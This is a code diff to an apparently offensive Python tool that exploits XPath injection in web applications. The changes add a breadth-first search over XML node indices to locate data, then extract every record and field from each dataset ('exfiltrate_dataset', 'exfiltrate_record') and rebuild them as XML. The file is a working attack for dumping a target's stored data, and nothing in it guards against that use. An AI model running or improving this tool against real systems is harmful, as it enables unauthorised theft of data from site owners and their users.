@@ -436,28 +436,84 @@ def probe_raw(
     return engine.send({inj_param: null_pay, node_param: f_value})
 
 
-def detect_depth(
+def find_data_path(
+    engine: Engine,
+    inj_param: str, null_pay: str,
+    node_param: str, field_name: str,
+    base_indices: list[int],
+    extractor: ResponseExtractor,
+    max_depth: int = 8,
+    max_siblings: int = 20,
+) -> Optional[list[int]]:
+    """
+    BFS search for the first path (from base_indices) that returns data.
+
+    Problem: intermediate nodes may be at any index, not just [1].
+    Example: /*[1]/*[2]/*[3]/*[1]/*[3] — the group node is at /*[3], not /*[1].
+
+    We do a level-by-level BFS:
+      - At each depth level, try indices 1..max_siblings
+      - If a probe returns data → we found a leaf → return full path
+      - If a probe returns "array-like" empty (no data but the page loaded) →
+        that index exists but has children → add to next BFS frontier
+      - Track "alive" paths (responded without error) to explore deeper
+
+    Returns the full indices list to the first data-bearing leaf, or None.
+    """
+    # Frontier: list of partial paths to explore
+    frontier: list[list[int]] = [list(base_indices)]
+    visited:  set[tuple] = set()
+
+    for _ in range(max_depth):
+        next_frontier: list[list[int]] = []
+
+        for path in frontier:
+            if tuple(path) in visited:
+                continue
+            visited.add(tuple(path))
+
+            # Try each sibling index at this level
+            for idx in range(1, max_siblings + 1):
+                candidate = path + [idx]
+                raw = probe_raw(engine, inj_param, null_pay, node_param,
+                                field_name, candidate)
+                val = extractor.extract(raw)
+                debug(f"  BFS {build_path(candidate)} → {val!r}")
+
+                if val is not None:
+                    # Found data — this is a leaf node
+                    return candidate
+
+                # Check if this node exists but has children (returns empty/array)
+                # Heuristic: page loaded (has HTML) but no data value
+                if raw and len(raw) > 100 and tuple(candidate) not in visited:
+                    next_frontier.append(candidate)
+
+        if not next_frontier:
+            break
+        frontier = next_frontier
+
+    return None
+
+
+def detect_first_data_path(
     engine: Engine,
     inj_param: str, null_pay: str,
     node_param: str, field_name: str,
     dataset_idx: int,
     extractor: ResponseExtractor,
     max_depth: int = 8,
-) -> tuple[Optional[int], Optional[str]]:
+    max_siblings: int = 20,
+) -> Optional[list[int]]:
     """
-    Returns (depth, sample_value) — the depth at which we first get data,
-    and the extracted sample value (used for calibration).
+    Find the XPath path to the first data value in this dataset.
+    Returns full index list e.g. [1, 2, 3, 1, 1] for /*[1]/*[2]/*[3]/*[1]/*[1]
     """
     base = [1, dataset_idx]
-    for extra in range(1, max_depth + 1):
-        indices = base + [1] * extra
-        raw     = probe_raw(engine, inj_param, null_pay, node_param, field_name, indices)
-        val     = extractor.extract(raw)
-        debug(f"  depth probe {build_path(indices)} → {val!r}")
-        if val is not None:
-            info(f"    Schema depth: {len(indices)}  sample='{val}'")
-            return len(indices), val
-    return None, None
+    return find_data_path(
+        engine, inj_param, null_pay, node_param, field_name,
+        base, extractor, max_depth, max_siblings,
+    )
 
 
 def exfiltrate_record(
@@ -468,6 +524,10 @@ def exfiltrate_record(
     extractor: ResponseExtractor,
     max_fields: int = 20,
 ) -> list[str]:
+    """
+    Extract all fields of one record.
+    base_indices points to the record node (last index will be incremented for each field).
+    """
     values: list[str] = []
     for field_idx in range(1, max_fields + 1):
         raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
@@ -486,36 +546,75 @@ def exfiltrate_dataset(
     dataset_idx: int,
     extractor: ResponseExtractor,
     max_depth: int, max_records: int, max_fields: int,
+    max_siblings: int = 20,
 ) -> list[list[str]]:
     print()
     info(f"Scanning dataset /*[1]/*[{dataset_idx}] ...")
 
-    depth, _ = detect_depth(
+    # Step 1: find the path to the first actual data value
+    first_path = detect_first_data_path(
         engine, inj_param, null_pay, node_param, field_name,
-        dataset_idx, extractor, max_depth,
+        dataset_idx, extractor, max_depth, max_siblings,
     )
-    if depth is None:
+    if first_path is None:
         warn(f"    Dataset /*[1]/*[{dataset_idx}] not found or empty.")
         return []
 
-    n_intermediate = depth - 3
-    if n_intermediate < 0:
-        warn("    Depth too shallow.")
+    info(f"    First data path: {build_path(first_path)}")
+
+    # Step 2: decompose the path
+    # Structure: [root=1, dataset_idx, *intermediate, record_idx, field_idx]
+    # first_path[-1] is field_idx (=1, the first field)
+    # first_path[-2] is record_idx (=1, the first record)
+    # first_path[2:-2] are intermediate group nodes (any indices)
+    if len(first_path) < 4:
+        warn("    Path too short to decompose into record/field structure.")
         return []
 
-    intermediate = [1] * n_intermediate
-    records: list[list[str]] = []
+    # The "record prefix" = everything up to but not including the record index
+    # i.e. [root, dataset, *groups]  — we'll append [rec_idx] to this
+    record_prefix = first_path[:-2]   # [1, dataset_idx, *intermediates]
+    # first record index found
+    first_rec_idx = first_path[-2]
 
-    for rec_idx in range(1, max_records + 1):
-        base   = [1, dataset_idx] + intermediate + [rec_idx]
+    info(f"    Record prefix: {build_path(record_prefix)}")
+    info(f"    First record index: {first_rec_idx}")
+
+    records: list[list[str]] = []
+    global_rec_num = 0
+
+    # Step 3: iterate records starting from the first discovered record index
+    for rec_idx in range(first_rec_idx, first_rec_idx + max_records):
+        base   = record_prefix + [rec_idx]
         record = exfiltrate_record(
             engine, inj_param, null_pay, node_param, field_name,
             base, extractor, max_fields,
         )
         if not record:
-            info(f"    End of records at index {rec_idx}.")
-            break
-        found(f"Record {rec_idx:>3}: {' | '.join(record)}")
+            # Some datasets have non-contiguous record indices (groups/subgroups).
+            # Try a few more before giving up.
+            debug(f"    No record at index {rec_idx}, trying next...")
+            # Allow up to 3 consecutive misses before stopping
+            misses = 0
+            for skip in range(rec_idx + 1, rec_idx + 4):
+                base2 = record_prefix + [skip]
+                r2    = exfiltrate_record(
+                    engine, inj_param, null_pay, node_param, field_name,
+                    base2, extractor, max_fields,
+                )
+                if r2:
+                    records.append(r2)
+                    global_rec_num += 1
+                    found(f"Record {global_rec_num:>3} [idx={skip}]: {' | '.join(r2)}")
+                    break
+                misses += 1
+            else:
+                info(f"    End of records at index {rec_idx}.")
+                break
+            continue
+
+        global_rec_num += 1
+        found(f"Record {global_rec_num:>3} [idx={rec_idx}]: {' | '.join(record)}")
         records.append(record)
 
     return records
@@ -528,20 +627,20 @@ def run_node_selection(
     extractor: ResponseExtractor,
     max_datasets: int, max_depth: int,
     max_records: int, max_fields: int,
+    max_siblings: int = 20,
 ) -> dict[int, list[list[str]]]:
     info(f"Node-selection | inj='{inj_param}' node='{node_param}' field='{field_name}'")
 
     # ── Calibrate extractor ───────────────────────────────────────────────────
+    # Find ANY data response quickly using simple [1,1,...] probe
     info("Calibrating response extractor...")
     null_html = engine.send({inj_param: null_pay})
-
-    # Find first data response for calibration (depth probe on dataset 1)
     calibrated = False
-    for ds in range(1, 4):
+
+    for ds in range(1, 3):
         for extra in range(1, max_depth + 1):
-            indices  = [1, ds] + [1] * extra
+            indices   = [1, ds] + [1] * extra
             data_html = probe_raw(engine, inj_param, null_pay, node_param, field_name, indices)
-            # Try to extract with regex first to get known_value for calibration
             for pattern in ResponseExtractor.RESULT_PATTERNS:
                 m = re.search(pattern, data_html, re.IGNORECASE | re.DOTALL)
                 if m:
@@ -556,11 +655,11 @@ def run_node_selection(
             break
 
     if not calibrated:
-        warn("Could not calibrate — will use best-effort extraction")
+        warn("Could not calibrate via simple probe — will use best-effort extraction")
         extractor._mode = "strip_diff"
         extractor._null_stripped = ResponseExtractor._strip_html(null_html)
 
-    # ── Exfiltrate ────────────────────────────────────────────────────────────
+    # ── Exfiltrate all datasets ───────────────────────────────────────────────
     all_data: dict[int, list[list[str]]] = {}
     consecutive_empty = 0
 
@@ -568,6 +667,7 @@ def run_node_selection(
         records = exfiltrate_dataset(
             engine, inj_param, null_pay, node_param, field_name,
             ds_idx, extractor, max_depth, max_records, max_fields,
+            max_siblings=max_siblings,
         )
         if records:
             all_data[ds_idx] = records
@@ -754,6 +854,12 @@ def parse_args():
     p.add_argument("--max-records",    type=int,   default=500)
     p.add_argument("--max-fields",     type=int,   default=20)
     p.add_argument("--predicate-step", type=int,   default=5)
+    p.add_argument("--max-siblings",   type=int,   default=20,
+                   help="Max sibling indices to probe per BFS level (default: 20)")
+    p.add_argument("--result-start",   default=None,
+                   help="Regex pattern marking start of result value (e.g. 'Results:.*?<br><br>')")
+    p.add_argument("--result-end",     default=None,
+                   help="Regex pattern marking end of result value (e.g. '</center>')")
     return p.parse_args()
 
 
@@ -837,10 +943,20 @@ def main():
     print()
     extractor = ResponseExtractor()
 
+    # Inject custom regex pattern if user provided start/end markers
+    if args.result_start or args.result_end:
+        start = args.result_start or ""
+        end   = args.result_end   or ""
+        custom_pattern = f"{start}(.+?){end}"
+        info(f"Using custom result pattern: {custom_pattern!r}")
+        # Prepend so it's tried first
+        ResponseExtractor.RESULT_PATTERNS.insert(0, custom_pattern)
+
     if method == "node_selection":
         data = run_node_selection(
             engine, inj_param, null_pay, node_param, field_name, extractor,
             args.max_datasets, args.max_depth, args.max_records, args.max_fields,
+            max_siblings=args.max_siblings,
         )
         xml_str = build_xml(data, field_name) if data else None
     else:
